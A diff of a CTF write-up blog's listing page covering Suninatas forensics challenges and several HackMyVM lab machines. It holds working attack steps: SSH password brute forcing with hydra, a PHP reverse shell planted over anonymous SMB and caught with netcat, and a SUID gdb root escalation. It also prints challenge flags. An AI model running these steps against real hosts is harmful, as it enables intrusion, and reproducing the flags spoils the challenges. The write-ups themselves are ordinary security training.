@@ -279,7 +279,7 @@ p.spoiler {
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/Suninatas/suninatas-game-30/">
+    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/Suninatas/suninatas-game-31/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.png">
@@ -297,7 +297,7 @@ p.spoiler {
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
-          <a href="/wp/Suninatas/suninatas-game-30/" class="post-title-link" itemprop="url">Suninatas Game 30</a>
+          <a href="/wp/Suninatas/suninatas-game-31/" class="post-title-link" itemprop="url">Suninatas Game 31</a>
         </h2>
 
         <div class="post-meta-container">
@@ -327,7 +327,7 @@ p.spoiler {
         <i class="far fa-file-word"></i>
       </span>
       <span class="post-meta-item-text">Word count in article: </span>
-      <span>249</span>
+      <span>223</span>
     </span>
     <span class="post-meta-item" title="Reading time">
       <span class="post-meta-item-icon">
@@ -338,7 +338,6 @@ p.spoiler {
     </span>
 </div>
 
-            <div class="post-description">Challenge analysis and method notes for Suninatas Game 30, covering forensics, memory-forensics, volatility.</div>
         </div>
       </header>
 
@@ -347,43 +346,30 @@ p.spoiler {
     
     <div class="post-body" itemprop="articleBody">
           <p><a target="_blank" rel="noopener" href="http://suninatas.com/challenges">challenges</a></p>
-<h2 id="game-30">Game 30</h2>
-<p>Challenge summary:</p>
-<ul>
-<li><code>Q1</code>: IP address of General Kim's PC</li>
-<li><code>Q2</code>: Secret document read by hacker</li>
-<li><code>Q3</code>: Content of that document (contains a key)</li>
-<li>Final: <code>lowercase(md5(Q1 + Q2 + Q3))</code></li>
-</ul>
-<p>Given artifact:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ file <span class="string">&#x27;MemoryDump(SuNiNaTaS)&#x27;</span></span><br><span class="line">MemoryDump(SuNiNaTaS): data</span><br></pre></td></tr></table></figure>
-<p>I used Volatility 3 throughout.</p>
-<h2 id="initial-triage">Initial triage</h2>
-<p>Identify OS profile and basic context:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ vol -f <span class="string">&#x27;MemoryDump(SuNiNaTaS)&#x27;</span> -s ~/symbols/ windows.info</span><br><span class="line">...</span><br><span class="line">Is64Bit   False</span><br><span class="line">NTBuildLab 7601.18044.x86fre.win7sp1_gdr.13</span><br><span class="line">SystemTime 2016-05-24 09:47:40+00:00</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
-<h2 id="q1-ip-address-of-general-kims-pc">Q1: IP address of General
-Kim's PC</h2>
-<p>Check active/known network artifacts:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ vol -f <span class="string">&#x27;MemoryDump(SuNiNaTaS)&#x27;</span> -s ~/symbols/ windows.netscan</span><br><span class="line">...</span><br><span class="line">0x3f270450 TCPv4 192.168.197.138 139   0.0.0.0         0   LISTENING   4 System</span><br><span class="line">0x3f270768 UDPv4 192.168.197.138 137   *               0               4 System</span><br><span class="line">0x3fdd5620 TCPv4 192.168.197.138 49248 113.29.189.142 80  ESTABLISHED  - -</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
-<p>Q1 answer:</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.197.138</span><br></pre></td></tr></table></figure>
-<h2 id="q2-which-secret-document-was-read">Q2: Which secret document was
-read?</h2>
-<p>Find interesting user actions from process arguments:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ vol -f <span class="string">&#x27;MemoryDump(SuNiNaTaS)&#x27;</span> -s ~/symbols/ windows.cmdline</span><br><span class="line">...</span><br><span class="line">3728 notepad.exe notepad C:\Users\training\Desktop\SecreetDocumen7.txt</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
-<p>Q2 answer:</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SecreetDocumen7.txt</span><br></pre></td></tr></table></figure>
-<h2 id="q3-contentkey-inside-the-secret-document">Q3: Content/key inside
-the secret document</h2>
-<p>Locate and dump the file from memory:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ vol -f <span class="string">&#x27;MemoryDump(SuNiNaTaS)&#x27;</span> -s ~/symbols/ windows.filescan | grep <span class="string">&#x27;SecreetDocumen7.txt&#x27;</span></span><br><span class="line">0x3df2ddd8 100.0\Users\training\Desktop\SecreetDocumen7.txt</span><br><span class="line"></span><br><span class="line">$ vol -f <span class="string">&#x27;MemoryDump(SuNiNaTaS)&#x27;</span> -s ~/symbols/ windows.dumpfiles --phy 0x3df2ddd8</span><br><span class="line">...</span><br><span class="line">file.0x3df2ddd8.0x85d7d150.DataSectionObject.SecreetDocumen7.txt.dat</span><br><span class="line"></span><br><span class="line">$ xxd file.0x3df2ddd8.0x85d7d150.DataSectionObject.SecreetDocumen7.txt.dat</span><br><span class="line">...</span><br><span class="line">00000050: 7920 6973 2022 3472 6d79 5f34 6972 666f  y is <span class="string">&quot;4rmy_4irfo</span></span><br><span class="line"><span class="string">00000060: 7263 655f 4e34 7679 2200 0000 0000 0000  rce_N4vy&quot;</span>.......</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
-<p>Q3 key:</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">4rmy_4irforce_N4vy</span><br></pre></td></tr></table></figure>
-<h2 id="final-auth-key">Final Auth Key</h2>
-<p>Concatenate in order:</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.197.138SecreetDocumen7.txt4rmy_4irforce_N4vy</span><br></pre></td></tr></table></figure>
-<p>Compute lowercase MD5:</p>
-<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">c152e3fb5a6882563231b00f21a8ed5f</span></span>
+<h2 id="game-31">Game 31</h2>
+<p>Challenge statement:</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">* Info : This PDF file don&#x27;t attack your PC. Just using for study.</span><br><span class="line">Analyze this PDF and Find a Flag.</span><br><span class="line">Auth Key = lowercase(MD5(Flag))</span><br></pre></td></tr></table></figure>
+<h2 id="initial-pdf-triage">Initial PDF triage</h2>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ pdfid Hello_SuNiNaTaS.pdf</span><br><span class="line">...</span><br><span class="line">/JS                    1</span><br><span class="line">/JavaScript            2</span><br><span class="line">/EmbeddedFile          0</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<p><code>pdfid</code> shows JavaScript indicators, but the interesting
+part is a nested object tree.</p>
+<h2 id="main-solve-path-works">Main solve path (works)</h2>
+<p>Search for JavaScript references and inspect container objects:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ pdf-parser -s JavaScript Hello_SuNiNaTaS.pdf</span><br><span class="line">obj 30 0</span><br><span class="line">  &lt;&lt;</span><br><span class="line">    /JavaScript 31 0 R</span><br><span class="line">    /EmbeddedFiles 38 0 R</span><br><span class="line">  &gt;&gt;</span><br></pre></td></tr></table></figure>
+<p>Follow embedded-file references:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ pdf-parser -o 38 Hello_SuNiNaTaS.pdf</span><br><span class="line">obj 38 0</span><br><span class="line">Referencing: 40 0 R</span><br><span class="line"></span><br><span class="line">$ pdf-parser -o 39 -f -d nested.pdf Hello_SuNiNaTaS.pdf</span><br><span class="line">obj 39 0</span><br><span class="line">Contains stream</span><br><span class="line">/Subtype /a</span><br><span class="line">/Filter /FlateDecode</span><br></pre></td></tr></table></figure>
+<p>Now analyze extracted <code>nested.pdf</code>:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$ pdfid nested.pdf</span><br><span class="line">...</span><br><span class="line">/Encrypt               1</span><br><span class="line">/JS                    1</span><br><span class="line">/JavaScript            1</span><br><span class="line">/OpenAction            1</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">$ qpdf --decrypt nested.pdf decrypted.pdf</span><br><span class="line"></span><br><span class="line">$ pdf-parser -s js decrypted.pdf</span><br><span class="line">obj 2 0</span><br><span class="line">  &lt;&lt;</span><br><span class="line">    /JS 4 0 R</span><br><span class="line">    /S /JavaScript</span><br><span class="line">  &gt;&gt;</span><br><span class="line"></span><br><span class="line">$ pdf-parser -o 4 -f -d dump decrypted.pdf</span><br><span class="line">$ <span class="built_in">cat</span> dump</span><br><span class="line"><span class="string">&quot;HERE IS FLAGS *********************&quot;</span></span><br></pre></td></tr></table></figure>
+<p>Flag:</p>
+<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">SunINatAsGOodWeLL!@#$</span></span>
+<h2 id="decoy-path-time-sink">Decoy path (time sink)</h2>
+<p>You can also extract object <code>37</code> as JavaScript
+payload:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ pdf-parser -o 37 -d payload.js Hello_SuNiNaTaS.pdf</span><br><span class="line">$ node payload.js</span><br><span class="line">Decoded content:</span><br><span class="line">Vm0wd2QyVkZOVWRXV0doVVYwZG9W...</span><br></pre></td></tr></table></figure>
+<p>Repeated Base64 decoding eventually gives:</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">I am sorry, This is not Key~!!</span><br></pre></td></tr></table></figure>
+<p>So object <code>37</code> is a distraction; the real flag is in the
+decrypted nested PDF JavaScript stream.</p>
 
       
     </div>
@@ -469,7 +455,6 @@ the secret document</h2>
     </span>
 </div>
 
-            <div class="post-description">Challenge analysis and method notes for Suninatas Game 32, covering forensics, fat32, hwp.</div>
         </div>
       </header>
 
@@ -609,7 +594,6 @@ Hancom/ONLYOFFICE).</p>
     </span>
 </div>
 
-            <div class="post-description">ReversingKR - Easy Crack 的题目分析与方法记录，涉及 reversing.kr。</div>
         </div>
       </header>
 
@@ -1192,7 +1176,6 @@ repo点星星。</p>
     </span>
 </div>
 
-            <div class="post-description">SMB file upload and SUID gdb privilege escalation.</div>
         </div>
       </header>
 
@@ -1213,6 +1196,102 @@ target="_blank" rel="noopener" href="https://hackmyvm.eu/machines/machine.php?vm
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">❯ smbclient --list=192.168.0.104 --no-pass</span><br><span class="line">Can&#x27;t load /etc/samba/smb.conf - run testparm to debug it</span><br><span class="line">Anonymous login successful</span><br><span class="line"></span><br><span class="line">        Sharename       Type      Comment</span><br><span class="line">        ---------       ----      -------</span><br><span class="line">        share           Disk</span><br><span class="line">        print$          Disk      Printer Drivers</span><br><span class="line">        IPC$            IPC       IPC Service (Private Share for uploading files)</span><br><span class="line">SMB1 disabled -- no workgroup available</span><br><span class="line"></span><br><span class="line">❯ enum4linux -a -o 192.168.0.104</span><br><span class="line">Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Fri Aug  8 17:47:46 2025</span><br><span class="line"></span><br><span class="line">Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none</span><br><span class="line"></span><br><span class="line">❯ smbclient //192.168.0.104/share -N</span><br><span class="line">smb: \&gt; cd html</span><br><span class="line">smb: \html\&gt; ls</span><br><span class="line">  index.html                          N    10701  Wed Sep 23 09:48:45 2020</span><br><span class="line"></span><br><span class="line">smb: \html\&gt; put reverseShell.php</span><br><span class="line">putting file reverseShell.php as \html</span><br><span class="line">everseShell.php (3818.0 kb/s) (average 3818.4 kb/s)</span><br><span class="line">smb: \html\&gt; ls</span><br><span class="line">  .                                   D        0  Fri Aug  8 18:12:41 2025</span><br><span class="line">  ..                                  D        0  Wed Sep 23 09:48:39 2020</span><br><span class="line">  index.html                          N    10701  Wed Sep 23 09:48:45 2020</span><br><span class="line">  reverseShell.php                    A     3910  Fri Aug  8 18:12:41 2025</span><br></pre></td></tr></table></figure>
 <p>suid gdb</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">❯ rlwrap nc -lvnp 8848</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">id</span></span></span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">python3 -c <span class="string">&quot;import pty; pty.spawn(&#x27;/bin/bash&#x27;);&quot;</span></span></span><br><span class="line"></span><br><span class="line">www-data@connection:/home/connection$ cat local.txt</span><br><span class="line">cat local.txt</span><br><span class="line">3f491443a2a6aa82bc86a3cda8c39617</span><br><span class="line"></span><br><span class="line">www-data@connection:/$ find / -perm -u=s -type f 2&gt;/dev/null | xargs ls -la</span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null | xargs ls -la</span><br><span class="line">-rwsr-xr-x 1 root root         54096 Jul 27  2018 /usr/bin/chfn</span><br><span class="line">-rwsr-xr-x 1 root root         44528 Jul 27  2018 /usr/bin/chsh</span><br><span class="line">-rwsr-sr-x 1 root root       8008480 Oct 14  2019 /usr/bin/gdb</span><br><span class="line">-rwsr-xr-x 1 root root         84016 Jul 27  2018 /usr/bin/gpasswd</span><br><span class="line">-rwsr-xr-x 1 root root         51280 Jan 10  2019 /usr/bin/mount</span><br><span class="line">-rwsr-xr-x 1 root root         44440 Jul 27  2018 /usr/bin/newgrp</span><br><span class="line">-rwsr-xr-x 1 root root         63736 Jul 27  2018 /usr/bin/passwd</span><br><span class="line">-rwsr-xr-x 1 root root         63568 Jan 10  2019 /usr/bin/su</span><br><span class="line">-rwsr-xr-x 1 root root         34888 Jan 10  2019 /usr/bin/umount</span><br><span class="line">-rwsr-xr-- 1 root messagebus   51184 Jul  5  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">-rwsr-xr-x 1 root root         10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device</span><br><span class="line">-rwsr-xr-x 1 root root        436552 Jan 31  2020 /usr/lib/openssh/ssh-keysign</span><br><span class="line"></span><br><span class="line">www-data@connection:/$ /usr/bin/gdb -nx -ex &#x27;python import os; os.execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-p&quot;)&#x27; -ex quit</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">cd</span> root</span></span><br><span class="line">cd root</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">ls</span> -al</span></span><br><span class="line">ls -al</span><br><span class="line">total 24</span><br><span class="line">drwx------  3 root root 4096 Sep 22  2020 .</span><br><span class="line">drwxr-xr-x 18 root root 4096 Sep 22  2020 ..</span><br><span class="line">lrwxrwxrwx  1 root root    9 Sep 22  2020 .bash_history -&gt; /dev/null</span><br><span class="line">-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc</span><br><span class="line">drwxr-xr-x  3 root root 4096 Sep 22  2020 .local</span><br><span class="line">lrwxrwxrwx  1 root root    9 Sep 22  2020 .mysql_history -&gt; /dev/null</span><br><span class="line">-rw-r--r--  1 root root  148 Aug 17  2015 .profile</span><br><span class="line">-rwx------  1 root root   33 Sep 22  2020 proof.txt</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">id</span></span></span><br><span class="line">id</span><br><span class="line">uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">cat</span> proof.txt</span></span><br><span class="line">cat proof.txt</span><br><span class="line">a7c6ea4931ab86fb54c5400204474a39</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/HackMyVM/HackMyVM-Gift/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="vkkkv">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hello Navi">
+      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Hello Navi">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/wp/HackMyVM/HackMyVM-Gift/" class="post-title-link" itemprop="url">HackMyVM - Gift</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2025-08-22 18:03:40" itemprop="dateCreated datePublished" datetime="2025-08-22T18:03:40+08:00">2025-08-22</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="Word count in article">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">Word count in article: </span>
+      <span>28</span>
+    </span>
+    <span class="post-meta-item" title="Reading time">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">Reading time &asymp;</span>
+      <span>1 mins.</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="gift">gift</h1>
+<p><a
+target="_blank" rel="noopener" href="https://hackmyvm.eu/machines/machine.php?vm=Gift">gift</a></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">❯ hydra -l root -P ctf/tool/dic/rockyou.txt -s 22 192.168.0.106 ssh</span><br><span class="line">...</span><br><span class="line">[22][ssh] host: 192.168.0.106   login: root   password: simple</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">simple</span><br><span class="line"></span><br><span class="line">gift:~# cat user.txt root.txt</span><br></pre></td></tr></table></figure>
 
       
     </div>
@@ -1298,7 +1377,6 @@ target="_blank" rel="noopener" href="https://hackmyvm.eu/machines/machine.php?vm
     </span>
 </div>
 
-            <div class="post-description">FTP anonymous access, SSH key leak, and Docker escape.</div>
         </div>
       </header>
 
@@ -1321,117 +1399,6 @@ target="_blank" rel="noopener" href="https://hackmyvm.eu/machines/machine.php?vm
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">❯ ftp 192.168.0.110</span><br><span class="line">...</span><br><span class="line"><span class="meta prompt_">ftp&gt; </span><span class="language-bash"><span class="built_in">dir</span></span></span><br><span class="line">200 PORT command successful. Consider using PASV.</span><br><span class="line">150 Here comes the directory listing.</span><br><span class="line">drwxr-xr-x    2 0        0            4096 Jul 10  2020 share</span><br><span class="line">226 Directory send OK.</span><br><span class="line"><span class="meta prompt_">ftp&gt; </span><span class="language-bash"><span class="built_in">cd</span> share</span></span><br><span class="line">250 Directory successfully changed.</span><br><span class="line"><span class="meta prompt_">ftp&gt; </span><span class="language-bash"><span class="built_in">dir</span></span></span><br><span class="line">200 PORT command successful. Consider using PASV.</span><br><span class="line">150 Here comes the directory listing.</span><br><span class="line">-rw-r--r--    1 0        0            2602 Jul 09  2020 id_rsa</span><br><span class="line">-rw-r--r--    1 0        0              75 Jul 09  2020 note.txt</span><br><span class="line">226 Directory send OK.</span><br><span class="line"><span class="meta prompt_">ftp&gt; </span><span class="language-bash">get id_rsa</span></span><br><span class="line">200 PORT command successful. Consider using PASV.</span><br><span class="line">150 Opening BINARY mode data connection for id_rsa (2602 bytes).</span><br><span class="line">226 Transfer complete.</span><br><span class="line">2602 bytes received in 0.0064 seconds (397.2097 kbytes/s)</span><br><span class="line"><span class="meta prompt_">ftp&gt; </span><span class="language-bash">get note.txt</span></span><br><span class="line">200 PORT command successful. Consider using PASV.</span><br><span class="line">150 Opening BINARY mode data connection for note.txt (75 bytes).</span><br><span class="line">226 Transfer complete.</span><br><span class="line">75 bytes received in 0.0064 seconds (11.4952 kbytes/s)</span><br><span class="line"><span class="meta prompt_">ftp&gt; </span><span class="language-bash">quit</span></span><br><span class="line">221 Goodbye.</span><br><span class="line"> </span><br><span class="line"> ❯ cat note.txt</span><br><span class="line"></span><br><span class="line">Wow you are here</span><br><span class="line"></span><br><span class="line">ariana won&#x27;t happy about this note</span><br><span class="line"></span><br><span class="line">sorry ariana :(</span><br><span class="line"></span><br><span class="line">ariana</span><br></pre></td></tr></table></figure>
 <p>ssh ariana</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line">❯ ssh ariana@192.168.0.110 -i id_rsa</span><br><span class="line">Linux pwned 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64</span><br><span class="line"></span><br><span class="line">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="line">the exact distribution terms for each program are described in the</span><br><span class="line">individual files in /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="line">permitted by applicable law.</span><br><span class="line">Last login: Fri Jul 10 13:03:23 2020 from 192.168.18.70</span><br><span class="line">ariana@pwned:~$ ls -la</span><br><span class="line">total 40</span><br><span class="line">drwxrwx--- 4 ariana ariana 4096 Jul 10  2020 .</span><br><span class="line">drwxr-xr-x 5 root   root   4096 Jul 10  2020 